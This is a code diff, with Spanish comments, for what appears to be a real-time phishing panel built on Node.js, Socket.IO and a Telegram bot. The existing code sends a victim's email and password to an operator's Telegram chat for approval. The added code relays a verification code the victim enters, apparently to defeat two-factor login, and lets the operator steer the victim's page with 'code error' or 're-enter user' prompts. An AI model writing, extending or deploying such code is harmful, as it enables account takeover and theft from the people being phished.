@@ -27,7 +27,7 @@ app.use(bodyParser.json());
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
-  // Al recibir datos del formulario
+  // Al recibir datos del formulario principal
   socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
     activeSockets.set(sessionId, socket); // Guardar el socket con sessionId
 
@@ -46,9 +46,28 @@ io.on('connection', (socket) => {
     bot.sendMessage(telegramChatId, mensaje, botones);
   });
 
-  // Cuando el navegador reconecta desde opciones.html
+  // Al reconectar el usuario
   socket.on('reconectar', (sessionId) => {
     activeSockets.set(sessionId, socket);
+  });
+
+  // Cuando se envía el código desde bienvenido.html
+  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
+    activeSockets.set(sessionId, socket);
+
+    const mensaje = `🔍 El usuario ingresó el siguiente código:\n\n🧾 Código: ${codigo}`;
+    const botones = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '❌ Error de código', callback_data: `error_${sessionId}` },
+            { text: '🔁 Pedir usuario', callback_data: `pedir_${sessionId}` }
+          ]
+        ]
+      }
+    };
+
+    bot.sendMessage(telegramChatId, mensaje, botones);
   });
 });
 
@@ -56,7 +75,11 @@ io.on('connection', (socket) => {
 bot.on('callback_query', (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
+  const callbackId = query.id;
 
+  bot.answerCallbackQuery(callbackId); // Confirmar a Telegram
+
+  // Manejo de botones de acceso
   if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
     const sessionId = data.split('_')[1];
     const socket = activeSockets.get(sessionId);
@@ -65,6 +88,22 @@ bot.on('callback_query', (query) => {
       const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
       socket.emit('respuesta', decision);
       bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
+    } else {
+      bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
+    }
+
+    activeSockets.delete(sessionId);
+  }
+
+  // Manejo de botones tras el ingreso de código
+  else if (data.startsWith('error_') || data.startsWith('pedir_')) {
+    const sessionId = data.split('_')[1];
+    const socket = activeSockets.get(sessionId);
+
+    if (socket) {
+      const decision = data.startsWith('error_') ? 'error' : 'pedir_usuario';
+      socket.emit('respuestaCodigo', decision);
+      bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '🔁 Ingrese nuevamente su usuario.');
     } else {
       bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
     }
